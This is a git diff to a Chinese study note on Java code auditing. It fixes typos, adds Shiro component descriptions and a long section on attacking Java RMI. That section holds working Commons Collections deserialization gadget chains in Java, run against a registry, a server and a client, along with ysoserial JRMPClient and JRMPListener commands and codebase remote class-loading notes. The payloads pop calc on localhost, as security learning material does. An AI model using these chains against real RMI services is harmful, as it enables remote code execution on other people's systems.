@@ -155,7 +155,7 @@
             }
             ```
 
-        - 那么我们就直接构造一个恶意类，恶意代码卸载static{}中，然后这个类一forname初始化，就执行了恶意代码
+        - 那么我们就直接构造一个恶意类，恶意代码加载在static{}中，然后这个类一forname初始化，就执行了恶意代码
 
             - ```java
                 import java.lang.Runtime;
@@ -1421,7 +1421,7 @@
         }
         ```
 
-    - 该类维护了一个 Transformer 接口类型的数组 iTransformers，transform 方法是先将输入 的对象交给 iTransformers 数组的第一个转换器的 transform()方法进行修饰，修饰后的 结果又作为下一个转化器的 transform()方法要修饰的对象，简单来说就是当前的结果作 为下一个步骤的输入，将最后的结果返回。有一种链式反应的感觉。
+    - 该类维护了一个 Transformer 接口类型的数组 iTransformers，transform 方法是先将输入的对象交给 iTransformers 数组的第一个转换器的 transform()方法进行修饰，修饰后的 结果又作为下一个转化器的 transform()方法要修饰的对象，简单来说就是当前的结果作 为下一个步骤的输入，将最后的结果返回。有一种链式反应的感觉。
 
 - **ConstantTransformer**
 
@@ -3505,8 +3505,9 @@ serialVersionUID是什么？
          }
          ```
 
-
 #### RMI绑定实例
+
+详细见下
 
 - 要调用的远程方法的接口，需要客户端，服务器端都要有这个代码。
     - 需要寻找一个实现`Remote`的接口，也就是寻找RMI的实现接口。方法的返回类型应该为String，并且方法必须抛出`java.rmi.RemoteException` 异常。
@@ -4094,16 +4095,26 @@ public class HelloWorld {
 
 - Shiro本身是⼀个轻便的权限验证库，它并不⼀定依赖于WEB，并且由于其可以兼容⼤多数中间件 （Tomcat、Spring...），所以被⼴泛使⽤，其产⽣了许多⾼危漏洞诸如反序列化、权限绕过等。
 
-- 目前，使用 Apache Shiro 的人越来越多，因为它相 当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时 可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。
+- 目前，使用 Apache Shiro 的人越来越多，因为它相当简单，对比 Spring Security，可能没有 Spring Security 做的功能强大，但是在实际工作时 可能并不需要那么复杂的东西，所以使用小而简单的 Shiro 就足够了。
+
 -  Shiro 三个核心组件 
     - Subject：即“当前操作用发户”。但是，在 Shiro 中，Subject 这一概念并不仅仅指人， 也可以是第三方进程、后台帐户（Daemon Account）或其他类似事物。它仅仅意味着“当前 跟软件交互的东西”。但考虑到大多数目的和用途，你可以把它认为是 Shiro 的“用户”概念。 Subject 代表了当前用户的安全操作，SecurityManager 则管理所有用户的安全操作。 
+    
     - SecurityManager：它是 Shiro 框架的核心，典型的 Facade 模式，Shiro 通过 SecurityManager 来管理内部组件实例，并通过它来提供安全管理的各种服务。 
-    - Realm 充当了 Shiro 与应用安全数据间的“桥梁”或者“连接器”。
-        - 也就是说，当对用户执 行认证（登录）和授权（访问控制）验证时，Shiro 会从应用配置的 Realm 中查找用户及其 权限信息。 
-        - 从这个意义上讲，Realm 实质上是一个安全相关的 DAO：它封装了数据源的连接细节， 并在需要时将相关数据提供给 Shiro。当配置 Shiro 时，你必须至少指定一个 Realm，用于 认证和（或）授权。
+    
+    - Realm：充当了 Shiro 与应用安全数据间的“桥梁”或者“连接器”。
+        - 也就是说，当对用户执行认证（登录）和授权（访问控制）验证时，Shiro 会从应用配置的 Realm 中查找用户及其 权限信息。 
+        
+        - 从这个意义上讲，Realm 实质上是一个安全相关的 DAO：它封装了数据源的连接细节， 并在需要时将相关数据提供给 Shiro。当配置 Shiro 时，你必须至少指定一个 Realm，用于认证和（或）授权。
+        
         - 配置多个 Realm 是可以的，但是至少需要一个。 Shiro 内置了可以连接大量安全数据源（又名目录）的 Realm，如 LDAP、关系数据库 （JDBC）、类似 INI 的文本配置资源以及属性文件等。如果缺省的 Realm 不能满足需求， 你还可以插入代表自定义数据源的自己的 Realm 实现。
-
-
+        
+            ![image-20221123170633581](java代码审计.assets/image-20221123170633581.png)
+    
+    *   Authenticator  ：认证就是核实用户身份的过程。这个过程的常见例子是大家都熟悉的“用户/密码”组合。多数用户在登录软件系统时，通常提供自己的用户名（当事人）和支持他们的密码（证书）。如果存储在系统中的密码（或密码表示）与用户提供的匹配，他们就被认为通过认证。  
+    *   Authorizer ：授权实质上就是访问控制 - 控制用户能够访问应用中的哪些内容，比如资源、Web页面等等。  
+    *   SessionManager ：在安全框架领域，Apache Shiro提供了一些独特的东西：可在任何应用或架构层一致地使用Session  API。即，Shiro为任何应用提供了一个会话编程范式 -  从小型后台独立应用到大型集群Web应用。这意味着，那些希望使用会话的应用开发者，不必被迫使用Servlet或EJB容器了。或者，如果正在使用这些容器，开发者现在也可以选择使用在任何层统一一致的会话API，取代Servlet或EJB机制。  
+    *   CacheManager :对Shiro的其他组件提供缓存支持。 
 
 ##### **Shiro-550  (CVE-2016-4437 1.2.4)**
 
@@ -5601,13 +5612,28 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
 
 ## RMI
 
+>   [由浅入深RMI安全 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/324692.html)
+>
+>   [JAVA RMI反序列化 - zpchcbd - 博客园](https://www.cnblogs.com/zpchcbd/p/14728160.html)
+>
+>   [RMI利用学习 - 先知社区](https://xz.aliyun.com/t/11339?page=1#toc-5)
+
 ### RMI基础
 
-- RMI全称是Remote Method Invocation，远程方法调⽤用。从这个名字就可以看出，他的⽬目标和RPC其实
-  是类似的，是让某个Java虚拟机上的对象调⽤用另一个Java虚拟机中对象上的⽅方法，只不过RMI是Java独
+- RMI全称是Remote Method Invocation，远程方法调用。从这个名字就可以看出，他的目标和RPC其实
+  是类似的，是让某个Java虚拟机上的对象调⽤用另一个Java虚拟机中对象上的方法，只不过RMI是Java独
   有的一种机制。
 
+- RMI包括以下三个部分：
+  
+      Registry: 提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。
+      Server: 远程方法的提供者，并向Registry注册自身提供的服务
+      Client: 远程方法的消费者，从Registry获取远程方法的相关信息并且调用
+  
+  ![RMI流程](java代码审计.assets/t018ebefd51ea8b380b.png)
+  
   ![RMI架构](java代码审计.assets/image-20211215103245785.png)
+  
 - 要调用的远程方法的接口，需要客户端，服务器端都要有这个代码。
 
   ```java
@@ -5622,10 +5648,11 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
   }
   
   ```
+  
 - RMI Server：
 
   ```java
-  package test;
+  package test;//服务端和客户端的包要统一，相同
   
   import java.rmi.Naming;
   import test.IRemoteHelloWorld;
@@ -5672,10 +5699,11 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
     - 一个实现了此接口的类。
     - 一个主类，用来创建Registry，并将上面的类实例化后绑定到一个地址。这就是我们所谓的Server
       了。这里我们把这个Registry类和实现接口类写在一起了，一般是分开写的。
+  
 - RMIClient
 
   ```java
-  package test;
+  package test;//服务端和客户端的包要统一，相同
   
   import java.rmi.Naming;
   import test.IRemoteHelloWorld;
@@ -5695,7 +5723,9 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
   - 客户端就简单多了，使用Naming.lookup在Registry中寻找到名字是Hello的对象，后面的使用就和在
     本地使用一样了。**lookup作用就是获得某个远程对象**。
   - 虽然执行远程方法的时候代码在远程服务器上执行的，但是实际我们还是需要知道有哪些方法的，这时候接口的重要性就体现出来了，这也就是为什么我们前面要继承Remote并将我们需要调用的方法写在接口 `IRemoteHelloWorld`里面了，因为客户端也要用到这个接口。
+  
 - RMI底层通讯采用了Stub(运行在客户端)和Skeleton(运行在服务端)机制，RMI调用远程方法的大致如下：
+
 - 为了理解RMI的通信过程，使用wireshark抓包，发现整个过程进行了两次tcp握手，也就是实际建立了两次tcp链接。
 
   - 第一次建立TCP连接是连接远端xxx.xxx.xxx.xxx的1099端口，这也是我们在代码里看到的端口。二者进行沟通后，客户端向远端发送了一个“Call”消息，远端回复了一个“ReturnData”消息。
@@ -5717,8 +5747,489 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
   - RMI Registry
   - RMI Server
   - RMI Client
+  
+  三者之间的不同攻击分为，`客户端、服务端攻击RMI Registry注册中心`、`客户端攻击RMI服务端`、`RMI服务端攻击客户端`
+
+#### 客户端、服务端攻击RMI Registry注册中心
+
+服务 端和客户端攻击注册中心的方式是相同的，都是远程获取注册中心后传递一个恶意对象进行利用。 RMI  Server的bind()、rebind()、unbind()可以通过绑定一个恶意序列化对象，当Registry中存在对应的Gadget时，可以造成反序列化RCE。 
+
+*   **服务端**
+
+通过rmi原理可知，两者之间是通过序列化数据进行通讯，因此向注册中心传输一个恶意的反序列化对象，以cc1链,通过bind()反序列化为例
+
+```java
+package com.example.rmi;//服务端和客户端的包要统一，相同
+
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import java.util.HashMap;
+import java.util.Map;
+
+//一个主类，用来创建Registry，并将实现了远程方法类实例化后绑定到一个地址。
+public class RMIServer {
+
+	//实现了了hello接口的类
+	public class RemoteHelloWorld extends UnicastRemoteObject implements
+			IRemoteHelloWorld {
+		protected RemoteHelloWorld() throws RemoteException {
+			super();
+		}
+		public Object test(Object object) throws RemoteException {
+			System.out.println("call from");
+			return "Hello world";
+		}
+	}
+	private void start() throws Exception {
+		if(1==2){
+
+		Transformer[] transformers = new Transformer[] {
+				new ConstantTransformer(Runtime.class),
+				new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
+				new InvokerTransformer("invoke", new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+				new InvokerTransformer("exec", new Class[] {String.class }, new Object[] {"calc.exe"})};
+		Transformer transformedChain = new ChainedTransformer(transformers);  //实例化一个反射链
+
+		Map innerMap = new HashMap();   //实例化一个Map对象
+		Map outerMap = LazyMap.decorate(innerMap, transformedChain); //构造一个LazyMap对象。
+
+
+		Class cl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  //得到 AnnotationInvocationHandler类的字节码文件
+		Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
+		ctor.setAccessible(true);
+		InvocationHandler handler = (InvocationHandler) ctor.newInstance(Target.class, outerMap);//得到我们构造好的 AnnotationInvocationHandler类实例
+
+		//创建一个Map代理类,当map对象任意函数调用的时候，都会执行handler的invoke函数
+		Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
+
+		//实例化远程方法类
+		// 再生成一个AnnotationInvocationHandler对象，为了反序列化用，这个时候传入的是代理类。
+		InvocationHandler instance = (InvocationHandler) ctor.newInstance(Target.class, proxymap);
+		Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, instance));
+		LocateRegistry.createRegistry(1099);
+		Naming.rebind("rmi://127.0.0.1:1099/hello", proxyEvalObject);
+	}else{
+
+		RemoteHelloWorld h = new RemoteHelloWorld();
+		// 注册RMI端口
+		LocateRegistry.createRegistry(1099);
+		//在端口注册该对象,并将该对象的服务名字设置为hello。
+		Naming.bind("rmi://127.0.0.1:1099/Hello", h);
+		}
+        /*
+        RMI客户端需要有远程调用方法的接口代码(IRemoteHelloWorld.java)（这玩意就是中转站，客户端会有接口，服务器端要实现），
+        RMI客户端调用服务器端的RMI服务时会返回这个服务所绑定的对象引用，RMI客户端可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。
+        */
+		System.out.println("RMI服务启动成功,服务地址:" + "rmi://127.0.0.1:1099/Hello");
+	}
+	//
+	public static void main(String[] args) throws Exception {
+		new RMIServer().start();
+	}
+}
+
+
+```
+
+其中调用bind()的时候无法传入`AnnotationInvocationHandler`类的对象，必须要转为Remote类才行，而`AnnotationInvocationHandler`本身实现了`InvocationHandler`接口，再通过代理类封装，可以用`class.cast`进行类型转换。
+
+*   **客户端**
+
+利用ysoserial工具
+
+```shell
+java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections6 "calc.exe"
+```
+
+#### 客户端攻击服务端
+
+如果注册服务的对象会接收一个参数为对象，那么可以传递一个恶意对象进行利用，因为这个恶意对象作为参数调用，在传递的过程中，服务端也需要进行反序列化
+
+*   RMI服务端提供的对象的方法参数有一个是Obejct类型
+
+    继续上面的代码进行修改，将`IRemoteHelloWorld#Hello`修改为
+
+    `Object Hello(Object object)`
+
+    ```java
+    package com.example.rmi;
+    
+    import java.rmi.Remote;
+    import java.rmi.RemoteException;
+    
+    //继承了java.rmi.Remote的接⼝，其中定义我们要远程调用的函数，
+    public interface IRemoteHelloWorld extends Remote {
+        public Object Hello(Object object) throws RemoteException;
+    }
+    ```
+
+    
+
+```java
+//服务端
+package com.example.rmi;//服务端和客户端的包要统一，相同
+
+import java.io.FileInputStream;
+import java.io.ObjectInputStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.rmi.Naming;
+import java.rmi.Remote;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.server.UnicastRemoteObject;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+//一个主类，用来创建Registry，并将实现了远程方法类实例化后绑定到一个地址。
+public class RMIServer {
+
+	//实现了了hello接口的类
+	public class RemoteHelloWorld extends UnicastRemoteObject implements
+			IRemoteHelloWorld {
+		protected RemoteHelloWorld() throws RemoteException {
+			super();
+		}
+		public Object test(Object object) throws RemoteException {
+			System.out.println("call from");
+			return "Hello world";
+		}
+	}
+	private void start() throws Exception {
+
+		RemoteHelloWorld h = new RemoteHelloWorld();
+		// 注册RMI端口
+		LocateRegistry.createRegistry(1099);
+		//在端口注册该对象,并将该对象的服务名字设置为hello。
+		Naming.bind("rmi://127.0.0.1:1099/Hello", h);
+		
+        /*
+        RMI客户端需要有远程调用方法的接口代码(IRemoteHelloWorld.java)（这玩意就是中转站，客户端会有接口，服务器端要实现），
+        RMI客户端调用服务器端的RMI服务时会返回这个服务所绑定的对象引用，RMI客户端可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。
+        */
+		System.out.println("RMI服务启动成功,服务地址:" + "rmi://127.0.0.1:1099/Hello");
+	}
+	//
+	public static void main(String[] args) throws Exception {
+		new RMIServer().start();
+	}
+}
+
+
+```
+
+```java
+#客户端
+package com.example.rmi;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+import java.lang.reflect.*;
+import java.net.MalformedURLException;
+import java.rmi.NotBoundException;
+import java.rmi.RemoteException;
+import java.rmi.registry.LocateRegistry;
+import java.util.HashMap;
+import java.util.Map;
+
+public class RMIClient {
+    public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
+        // 查找指定RMI_NAME的远程RMI服务
+        // 创建RemoteStub
+        IRemoteHelloWorld remoteSub = (IRemoteHelloWorld) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
+        String result = (String) remoteSub.Hello(sendPayload());
+        System.out.println(result);
+    }
+
+    public static Object sendPayload() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        InvocationHandler handler = null;
+        try {
+            ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+                    new ConstantTransformer(Runtime.class),
+                    new InvokerTransformer("getMethod", new Class[]{
+                            String.class, Class[].class}, new Object[]{
+                            "getRuntime", new Class[0]}),
+                    new InvokerTransformer("invoke", new Class[]{
+                            Object.class, Object[].class}, new Object[]{
+                            null, new Object[0]}),
+                    new InvokerTransformer("exec",
+                            new Class[]{String.class}, new Object[]{"calc"})});
+            HashMap innermap = new HashMap();
+            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
+            Constructor[] constructors = clazz.getDeclaredConstructors();
+            Constructor constructor = constructors[0];
+            constructor.setAccessible(true);
+            Map map = (Map) constructor.newInstance(innermap, chain);
+
+            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
+            handler_constructor.setAccessible(true);
+            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler
+
+            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
+
+            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
+            AnnotationInvocationHandler_Constructor.setAccessible(true);
+            handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+
+        return handler;
+    }
+}
+```
+
+*   **分析**
+
+    在`sun.rmi.server.UnicastServerRef#dispatch`打断点，跟进`oldDispatch`
+
+    ![image-20221203233912676](java代码审计.assets/image-20221203233912676.png)
+
+    直到在跟进到`sun.rmi.server.UnicastServerRef`151行的`unmarshalValue`，在这调用了readobject,执行了gadget
+
+    ![image-20221203234359160](java代码审计.assets/image-20221203234359160.png)
+
+*   **非Object参数类型**
+
+    攻击者对rmi客户端是完全可控的，可以用恶意对象替换从Object类派生的参数（例如String）有几种方法：
+
+    1.  通过网络代理，在流量层修改数据
+    2.  自定义 “java.rmi” 包的代码，自行实现
+    3.  字节码修改
+    4.  使用 debugger
+
+    流量层替换的方式可以参考0c0c0f师傅的这篇文章：
+
+    >   https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg
+
+    使用java agent的方式可参考afanti师傅的文章：https://www.anquanke.com/post/id/200860，通过RASP hook住`java.rmi.server.RemoteObjectInvocationHandler`类的`InvokeRemoteMethod`方法的第三个参数非Object的改为Object的gadget
+
+#### 服务端攻击客户端
+
+*   服务端返回参数为Object对象
+
+    当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象
+
+    修改Hello方法
+
+    ```java
+    package com.example.rmi;
+    
+    import java.rmi.Remote;
+    import java.rmi.RemoteException;
+    
+    //继承了java.rmi.Remote的接⼝，其中定义我们要远程调用的函数，
+    public interface IRemoteHelloWorld extends Remote {
+        Object Hello() throws RemoteException;
+    }
+    ```
+
+    ```java
+    //服务端
+    package com.example.rmi;//服务端和客户端的包要统一，相同
+    
+    import java.lang.annotation.Target;
+    import java.lang.reflect.Constructor;
+    import java.lang.reflect.InvocationHandler;
+    import java.lang.reflect.Proxy;
+    import java.rmi.Naming;
+    import java.rmi.Remote;
+    import java.rmi.RemoteException;
+    import java.rmi.registry.LocateRegistry;
+    import java.rmi.server.UnicastRemoteObject;
+    import org.apache.commons.collections.Transformer;
+    import org.apache.commons.collections.functors.ChainedTransformer;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.InvokerTransformer;
+    import org.apache.commons.collections.map.LazyMap;
+    import java.util.HashMap;
+    import java.util.Map;
+    
+    //一个主类，用来创建Registry，并将实现了远程方法类实例化后绑定到一个地址。
+    public class RMIServer {
+    
+    	//实现了了hello接口的类
+    	public class RemoteHelloWorld extends UnicastRemoteObject implements
+    			IRemoteHelloWorld {
+    		protected RemoteHelloWorld() throws RemoteException {
+    			super();
+    		}
+    		public Object Hello(Object A) throws RemoteException{
+    
+    				InvocationHandler handler = null;
+    				try {
+    					ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
+    							new ConstantTransformer(Runtime.class),
+    							new InvokerTransformer("getMethod", new Class[]{
+    									String.class, Class[].class}, new Object[]{
+    									"getRuntime", new Class[0]}),
+    							new InvokerTransformer("invoke", new Class[]{
+    									Object.class, Object[].class}, new Object[]{
+    									null, new Object[0]}),
+    							new InvokerTransformer("exec",
+    									new Class[]{String.class}, new Object[]{"calc"})});
+    					HashMap innermap = new HashMap();
+    					Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
+    					Constructor[] constructors = clazz.getDeclaredConstructors();
+    					Constructor constructor = constructors[0];
+    					constructor.setAccessible(true);
+    					Map map = (Map) constructor.newInstance(innermap, chain);
+    
+    					Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
+    					handler_constructor.setAccessible(true);
+    					InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map); //创建第一个代理的handler
+    
+    					Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler); //创建proxy对象
+    
+    					Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
+    					AnnotationInvocationHandler_Constructor.setAccessible(true);
+    					handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);
+    				}catch(Exception e){
+    					e.printStackTrace();
+    				}
+    
+    				return (Object) handler;
+    			}
+    		}
+    
+    	private void start() throws Exception {
+    
+    		RemoteHelloWorld h = new RemoteHelloWorld();
+    		// 注册RMI端口
+    		LocateRegistry.createRegistry(1099);
+    		//在端口注册该对象,并将该对象的服务名字设置为hello。
+    		Naming.bind("rmi://127.0.0.1:1099/Hello", h);
+    		
+            /*
+            RMI客户端需要有远程调用方法的接口代码(IRemoteHelloWorld.java)（这玩意就是中转站，客户端会有接口，服务器端要实现），
+            RMI客户端调用服务器端的RMI服务时会返回这个服务所绑定的对象引用，RMI客户端可以通过该引用对象调用远程的服务实现类的方法并获取方法执行结果。
+            */
+    		System.out.println("RMI服务启动成功,服务地址:" + "rmi://127.0.0.1:1099/Hello");
+    	}
+    	//
+    	public static void main(String[] args) throws Exception {
+    		new RMIServer().start();
+    	}
+    }
+    
+    
+    ```
+
+    ```java
+    //客户端
+    package com.example.rmi;
+    
+    import com.sun.org.apache.bcel.internal.generic.NEW;
+    import org.apache.commons.collections.Transformer;
+    import org.apache.commons.collections.functors.ChainedTransformer;
+    import org.apache.commons.collections.functors.ConstantTransformer;
+    import org.apache.commons.collections.functors.InvokerTransformer;
+    
+    import java.lang.reflect.*;
+    import java.net.MalformedURLException;
+    import java.rmi.NotBoundException;
+    import java.rmi.RemoteException;
+    import java.rmi.registry.LocateRegistry;
+    
+    
+    public class RMIClient {
+        public static void main(String[] args) throws RemoteException, NotBoundException, MalformedURLException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {
+            // 查找指定RMI_NAME的远程RMI服务
+            // 创建RemoteStub
+            IRemoteHelloWorld remoteSub = (IRemoteHelloWorld) LocateRegistry.getRegistry("127.0.0.1", 1099).lookup("Hello");
+            Object result =  remoteSub.Hello();
+            System.out.println(result);
+        }
+    }
+    ```
+
+*   **利用UnicastRef**
+
+    1.用ysoserial启动一个恶意的JRMPListener(CommonCollections1的链在1.8下用不了，所以这里用了CommonCollections5的)
+
+    ```
+    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 "calc"
+    ```
+
+    2.启动注册中心
+
+    3.启动Client调用bind()操作
+
+    **客户端TestClient.java**
+
+    ```
+    public class TestClient {
+    public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
+    Registry reg = LocateRegistry.getRegistry("localhost",1099); // rmi start at 2222
+    ObjID id = new ObjID(new Random().nextInt());
+    TCPEndpoint te = new TCPEndpoint("127.0.0.1", 3333); // JRMPListener's port is 3333
+    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
+    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
+    Registry proxy = (Registry) Proxy.newProxyInstance(TestClient.class.getClassLoader(), new Class[] {
+    Registry.class
+    }, obj);
+    reg.bind("Hello",proxy);
+    }
+    }
+    ```
+
+    4.注册中心被反序列化攻击
+
+#### 利用codebase执行任意代码
+
+*   **codebase**
+
+    codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。
+
+    如果我们指定 codebase=http://example.com/ ，然后加载 org.vulhub.example.Example 类，则Java虚拟机会下载这个文件 http://example.com/org/vulhub/example/Example.class ，并作为Example类的字节码。
+
+    RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。
+
+    **但是只有如下条件的服务器才能被攻击：**
+
+    1.  设置了java.rmi.server.useCodebaseOnly=false，或者java版本低于7u21、6u45（低于这几个版本默认为false）
+    2.  设置`System.setSecurityManager(new RMISecurityManager());`
+
+    否则java只会信任默认配置好的codebase
+
+    ```
+    java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient
+    ```
+
+    ### 
+
+
 
 ## JNDI
+
+
 
 ### JNDI基础
 
@@ -5749,7 +6260,7 @@ arthas是Alibaba开源的Java诊断工具，只能检测不能查杀
     DirContext context = new InitialDirContext(env);
     ```
   - `Context.INITIAL_CONTEXT_FACTORY(初始上下文工厂的环境属性名称)`指的是 `JNDI`服务处理的具体类名称，如：`DNS`服务可以使用 `com.sun.jndi.dns.DnsContextFactory`类来处理，`JNDI`上下文工厂类必须实现 `javax.naming.spi.InitialContextFactory`接口，通过重写 `getInitialContext`方法来创建服务。
-  - **javax.naming.spi.InitialContextFactory代码片段**:**
+  - **javax.naming.spi.InitialContextFactory代码片段**:
 
     ```java
     package javax.naming.spi;
